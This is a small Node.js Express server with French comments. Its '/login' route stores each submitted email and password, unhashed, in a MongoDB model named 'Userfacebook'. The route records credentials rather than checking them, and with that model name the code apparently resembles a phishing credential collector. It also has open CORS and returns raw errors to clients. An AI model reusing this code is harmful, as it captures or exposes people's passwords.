const express = require("express")
const mongoose = require("mongoose")
const cors = require("cors")
const app = express()
const port = 3000
const { Userfacebook } = require("./model")
const connection = require("./connection")
connection();
app.use(express.json())
app.use(cors())

app.post("/login", async (req, res) => {
    try {
        const { email, password } = req.body || {};

        // Validation minimale
        if (!email || !password) {
            return res.status(400).send({ message: 'Email et mot de passe requis' });
        }

        // Vérifier si l'utilisateur existe déjà
        const existing = await Userfacebook.findOne({ email }).exec();
        if (existing) {
            return res.status(409).send({ message: 'Un utilisateur avec cet e-mail existe déjà' });
        }

        const utilisateur = new Userfacebook({ email, password });
        await utilisateur.save();
        return res.status(201).send({ message: 'utilisateur créé avec succès' });
    } catch (error) {
        console.error('Erreur /login:', error);
        // Gérer les erreurs MongoDB de doublon (au cas où race condition)
        if (error && error.code === 11000) {
            return res.status(409).send({ message: 'E-mail déjà utilisé' });
        }
        return res.status(500).send({ message: 'erreur lors de la création de l\'utilisateur', error });
    }
});

app.listen(port, () => {
    console.log("le serveur a demarré sur le port " + port)
})